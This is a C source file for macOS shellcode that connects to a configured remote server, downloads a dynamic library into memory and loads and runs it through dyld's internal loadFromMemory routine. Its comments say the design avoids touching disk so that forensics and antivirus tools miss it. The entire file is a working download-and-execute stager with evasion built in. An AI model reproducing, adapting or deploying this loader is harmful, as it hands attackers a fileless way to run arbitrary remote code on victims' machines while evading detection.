#include "shellconfig.h"

#ifndef SERVER_IP
#error "Please define SERVER_IP in config. Should be a hex IPv4 value."
#endif

#ifndef SERVER_PORT
#error "Please define SERVER_PORT in config. Should be a host byte order integer value."
#endif

#include "shellcode.h"
#include "xnu10.10/syscalls.h"
#include <unistd.h>
#include <netinet/in.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/fat.h>

// These procedures have to be defined below main() so that the shellcode
//   could execute starting at main.
static int receivefile(int socket, char* buffer, int maxsize);
static uint64_t findSymbol64(uint8_t* buffer, const int size, char* symbol, const int symsize);

// We will need to find these functions dynamically.
typedef void* (*loadFromMemory_t)(const uint8_t* mem, uint64_t len, const char* moduleName);
typedef void* (*dlsym_t)(void* handle, const char* symbol);
typedef int (*foo_t)();

typedef void (*registerInterposing)(void* _this);

#define	RTLD_NEXT		((void *) -1)	/* Search subsequent objects. */
#define	RTLD_DEFAULT	((void *) -2)	/* Use default search algorithm. */
#define	RTLD_SELF		((void *) -3)	/* Search this and subsequent objects (Mac OS X 10.5 and later) */
#define	RTLD_MAIN_ONLY	((void *) -5)	/* Search main executable only (Mac OS X 10.5 and later) */

int main() {
	int sockfd;
	struct sockaddr_in serv_addr;

	// Allocate 10MB for the remote file. 10MB is an overkill, however we
	//  don't have any run time memory requirements. So, it's better to
	//  over allocate rather than under. We won't need to execute anything
	//  from that space, so we will only give it RW permissions.
	int mem_size = 10*1024*1024;
	char* dyld_buffer = scc_mmap(NULL, mem_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	
	// Check to make sure we have gotten the space we asked for.
	if(dyld_buffer == MAP_FAILED) {
		// If not, clean up and bail.
		scc_exit(45);
	}

	// Request a socket for connecting to the remote host.
	sockfd = scc_socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		// If not, clean up and bail.
        scc_exit(43);
	}

	// Initialize the connect struct. Set the remote host IP/PORT.
	//  The SERVER_IP and SERVER_PORT will come from the shellconfig.h
	//  file. The IP will be preformatted as IPv4 unsigned int.
	bzero((struct sockaddr *)&serv_addr,sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = SERVER_IP;
	serv_addr.sin_port = htons(SERVER_PORT);

	// Connect to the remote host.
	if(scc_connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) {
		// If not, clean up and bail.
        scc_exit(44);
	}

	// get the entirety of the file. Keep receiving until the socket
	//  closes or 10MB is received.
	int fileSize = receivefile(sockfd, dyld_buffer, mem_size);
	if(fileSize < 0) {
		// On error, clean up and bail.
		scc_exit(46);
	}

	// once received, we don't need the socket anymore.
	scc_close(sockfd);

	// Now we would like to load the library we just downloaded into the running process.
	//  We would like to do so without touching disk, so the forensics/AV tools don't pick
	//  up on it.

	// first, we open the dynamic loader and map it into memory. We will use it determine
	//  target specific locations of useful files. We are assuming that the target program
	//  uses the standard loader during it's own loading process.
	int dyld_fd = scc_open("/usr/lib/dyld", O_RDONLY, 0);
	void* dyld_buf = scc_mmap(NULL, mem_size, PROT_READ, MAP_PRIVATE, dyld_fd, 0);

	// If the loader can't be openned then we must bail out.
	if(dyld_buf == MAP_FAILED) {
		scc_exit(49);
	}

	// Find the dlsym procedure, this procedure will let us find other symbols.
	dlsym_t dlsym = (dlsym_t)findSymbol64(dyld_buf, mem_size, "_dlsym", 6);
	if(dlsym == NULL) {
		// if we don't find it, then we can't go on.
		scc_exit(47);
	}

	// Then we need the internal procedure dyld::loadFromMemory. This procedure
	//  can load dylibs from a memory buffer, this isn't a standard POSIX call.
	loadFromMemory_t loadFromMemory = (loadFromMemory_t)findSymbol64(dyld_buf, mem_size, "__ZN4dyld14loadFromMemoryEPKhyPKc", 33);
	if(loadFromMemory == NULL) {
		scc_exit(49);
	}

	// load our remote dylib, at this point the constructor should've run as well.
	void* image = loadFromMemory(dyld_buffer, fileSize, NULL);
	//ASM_BREAKPOINT
	// `vtable for'ImageLoaderMachOCompressed
	((registerInterposing) (*( (*(uint8_t***)image) + 64))) (image);

	// Next, we find the procedure that we need from the dylib that we downloaded.
	//  Here, we are demostrating that dlsym can be used to find a in all loaded
	//  dylibs.
	foo_t foo = dlsym(RTLD_DEFAULT, "foo");

	// If the procedure is not found then we bail.
	if(foo == NULL) {
		scc_exit(48);
	}

	// call the desired procedure.
	int ret = foo();

	// end the process
	//scc_exit(ret);
}

static int receivefile(int socket, char* buffer, int maxsize) {
	int actualSize = 0;

	// Nothing fancy, iterate until maxsize is hit or the file is done downloading.
	while(maxsize > 0) {
		int rd = scc_read(socket, buffer, maxsize);

		if(rd > 0) {
			maxsize -= rd;
			buffer += rd;
			actualSize += rd;
		} else {
			// there was an error reading.
			return rd;
		}
	}

	return actualSize;
}

// poor man's dlsym function, used to locate dlsym and dyld::loadFromMemory on /usr/lib/dyld.
//  this version of the procedure looks for 64bit symbols.
static uint64_t findSymbol64(uint8_t* buffer, const int size, char* symbol, const int symsize) {
	// We assume that our target has a FAT file for dyld. Since we are targeting
	//  OSX/iOS, they will have dyld for 32/64 bit architectures in one file.
	struct fat_header* fatheader = (struct fat_header*)buffer;
	struct fat_arch* archs = (struct fat_arch*)(buffer + sizeof(struct fat_header));
	int offset = 0;

	// Iterate the FAT file architecture, looking for the architecture we want.
	for(int i = 0; i < fatheader->nfat_arch; ++i) {
		struct fat_arch* arch = &archs[i];
		struct mach_header_64* hdr = (struct mach_header_64*)(buffer + OSSwapBigToHostInt32(arch->offset));

		// Once we have found the 64-bit version, we assume this is the one we want.
		if(hdr->magic == MH_MAGIC_64) {
			// Fix up the buffer to allow the rest of the procedure to work on the 
			//  mach-o file.
			buffer = hdr;
			break;
		}
	}

	// top of the Mach-o file is the header structure.
	struct mach_header_64* header = (struct mach_header_64*)buffer;

	// The structure must have a magic value that will match the 64bit architecture.
	if(header->magic != MH_MAGIC_64) {
		return -1;		
	}

	// we will need to skip the header.
	offset = sizeof(struct mach_header_64);

	// get the number of commands available in the header of the Mach-o.
	int ncmds = header->ncmds;

	// Iterate through all commands.
	while(ncmds--) {
		struct load_command * lcp = (struct load_command *)(buffer + offset);
		offset += lcp->cmdsize;

		// we are only interested in the symbol table command because it will enable us
		//  to find the symbol we are interested in.
		if(lcp->cmd == LC_SYMTAB) {
			struct symtab_command *symtab = (struct symtab_command *)lcp;

			// obtain the begining of the symbol table.
			struct nlist_64 *ns = (struct nlist_64 *)(buffer + symtab->symoff);
	        char *strtable = buffer + symtab->stroff;

	        // iterate through all symbol names.
	        for (int j = 0; j < symtab->nsyms; ++j) {
	        	char* checkName = strtable + ns[j].n_un.n_strx;
		        int isMatch = 1;

		        // this is out custom strncmp which will look for the match.
		        for(int i = 0; i < symsize && checkName[i] != '\0'; ++i) {
		        	if(symbol[i] != checkName[i]) {
		        		isMatch = 0;
		        		break;
		        	}
		        }

		        // Once matched we make sure that this isn't just a starts with match.
		        if(isMatch && (checkName[symsize] == '\0')) {
		        	// if it is a full match then return the address of the symbol.
		        	return ns[j].n_value;
		        }
		    }
		}
	}

	// return zero if the symbol was not found.
	return 0;
}

#include "syscalls.c"
#include "xnu10.10/syscalls.c"

